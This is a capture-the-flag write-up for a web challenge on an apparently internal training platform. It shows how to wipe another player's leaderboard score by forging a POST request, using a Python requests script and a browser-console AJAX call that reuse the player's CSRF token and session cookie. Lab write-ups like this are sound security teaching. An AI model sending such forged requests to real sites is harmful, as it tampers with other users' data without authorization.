# Tree Chopper

## Description

Ever heard of arcade games? Try this game out! However, you reallyyyy hate your best friend Timmy for being the best in the world in this game, with a high score of 500,000! Try to delete Timmy's high score from the leaderboard using a POST request and waste his efforts! No hate but his cocky attitude needs to be humbled :)

Unfortunately, you don't have the privilege of contributing to the leaderboard as it is fake... but my high score is 450! Try to beat me :p - Jordan Lee

*Add "beforeSend: function (canvas) {canvas.setRequestHeader(_csrf_header, _csrf_token);}" for csrf token*

## Solution

1. Forge an AJAX POST request to /challenges/tree-chopper with the following data to overwrite `Timmy`'s score to 0:
```json
{
    "username":"Timmy",
    "score":0
}
```

2. This is possibly my least favorite challenge on mimosa because of how guessy it is lol.

```py
import requests
import sys

sys.path.append("../../") # danger danger, do not change!! (secrets will break)

from Secrets.csrf import CSRF_KEY, CSRF_VALUE
from Secrets.session import SESSION_KEY, SESSION_VALUE

# Disable SSL warnings (mimosa uses a self-signed certificate)
requests.packages.urllib3.disable_warnings()

# Constants
URL = "https://mimosadism.dmit.local/challenges/tree-chopper"

headers = {
    CSRF_KEY: CSRF_VALUE,
}

cookies = {
    SESSION_KEY: SESSION_VALUE,
}

data = {
    "username":"Timmy",
    "score":0
}

try:
    response = requests.post(URL, headers=headers, cookies=cookies, json=data, verify=False)
    print(response.text)

except requests.RequestException as e:
    print(f"Request failed: {e}")
```

3. Alternatively, you can also send the request over the chrome console with the following AJAX request:
```js
    $.ajax({
      url: "/challenges/tree-chopper",
      type: "post",
      data: JSON.stringify({
        username: "Timmy",
        score: 0,
      }),
      contentType: "application/json",
      //CSRF protection
      beforeSend: function (e) {
        e.setRequestHeader(_csrf_header, _csrf_token);
      },
      success: function (e, t, n) {
        "function" == typeof window.default_challenge_success &&
          window.default_challenge_success(e);
      },
      error: function (e, t, n) {
        "function" == typeof window.default_challenge_error &&
          window.default_challenge_error(n);
      },
    });
```